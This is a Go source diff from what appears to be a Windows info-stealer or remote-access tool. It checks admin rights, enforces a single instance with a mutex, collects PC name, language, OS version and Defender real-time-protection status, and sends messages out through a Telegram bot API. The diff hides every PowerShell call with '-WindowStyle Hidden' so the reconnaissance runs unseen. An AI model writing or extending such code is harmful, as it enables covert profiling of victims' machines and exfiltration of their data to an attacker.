@@ -112,7 +112,7 @@ func isAdmin() bool {
 }
 
 func getSystemLanguage() string {
-    cmd := exec.Command("powershell", "-Command", "[System.Globalization.CultureInfo]::CurrentCulture.Name")
+    cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "[System.Globalization.CultureInfo]::CurrentCulture.Name")
     output, err := cmd.Output()
     if err != nil {
         return "Unknown"
@@ -121,13 +121,29 @@ func getSystemLanguage() string {
 }
 
 func getWindowsVersion() string {
-    cmd := exec.Command("powershell", "-Command", "(Get-WmiObject -Class Win32_OperatingSystem).Caption")
+    cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "(Get-WmiObject -Class Win32_OperatingSystem).Caption")
     output, err := cmd.Output()
     if err != nil {
         return "Unknown"
     }
     return strings.TrimSpace(string(output))
 }
+
+func isAntivirusEnabled() string {
+    cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled")
+    output, err := cmd.Output()
+    if err != nil {
+        return "Unknown"
+    }
+    status := strings.TrimSpace(string(output))
+    if status == "True" {
+        return "Enabled"
+    } else if status == "False" {
+        return "Disabled"
+    }
+    return "Unknown"
+}
+
 
 func ensureSingleInstance() bool {
 	mutex, err := windows.CreateMutex(nil, false, windows.StringToUTF16Ptr(mutexName))
@@ -245,22 +261,6 @@ func getPCName() string {
 	}
 	return name
 }
-
-func isAntivirusEnabled() string {
-    cmd := exec.Command("powershell", "Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled")
-    output, err := cmd.Output()
-    if err != nil {
-        return "Unknown"
-    }
-    status := strings.TrimSpace(string(output))
-    if status == "True" {
-        return "Enabled"
-    } else if status == "False" {
-        return "Disabled"
-    }
-    return "Unknown"
-}
-
 
 func sendMessageToTelegram(message string) error {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
